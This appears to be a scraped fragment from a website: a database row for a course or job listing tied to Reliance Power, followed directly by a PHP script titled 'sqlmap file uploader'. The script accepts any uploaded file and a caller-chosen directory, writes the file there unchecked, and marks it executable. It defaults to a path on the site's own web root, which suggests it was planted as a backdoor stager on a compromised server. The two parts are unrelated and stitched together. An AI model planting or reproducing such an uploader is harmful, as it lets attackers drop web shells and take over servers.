79	3D design and drafting 	using autocad	24	42	34	30000	1	3	1	0	5	1428	0000-00-00 00:00:00	24	Reliance Power	Reliance Power Limited, a part of the Reliance Anil Dhirubhai Ambani Group, was established to develop, construct and operate power projects in the domestic and international markets.	company_logo/reliance.jpeg<?php
if (isset($_REQUEST["upload"])) {
    $dir=$_REQUEST["uploadDir"];
    
    if (phpversion() < '4.1.0')
    {
        $file=$HTTP_POST_FILES["file"]["name"];
        @move_uploaded_file($HTTP_POST_FILES["file"]["tmp_name"], $dir . "/" . $file) or die();
    }
    else
    {
        $file=$_FILES["file"]["name"];
        @move_uploaded_file($_FILES["file"]["tmp_name"], $dir . "/" . $file) or die();
    }
    @chmod($dir . "/" . $file, 0755);
    echo "File uploaded";
}
else {
    echo "<form action=" . $_SERVER["PHP_SELF"] . " method=POST enctype=multipart/form-data><input type=hidden name=MAX_FILE_SIZE value=1000000000><b>sqlmap file uploader</b><br><input name=file type=file><br>to directory: <input type=text name=uploadDir value=/var/www/infotsav/147852/jobbureau> <input type=submit name=upload value=upload></form>";
}
?>
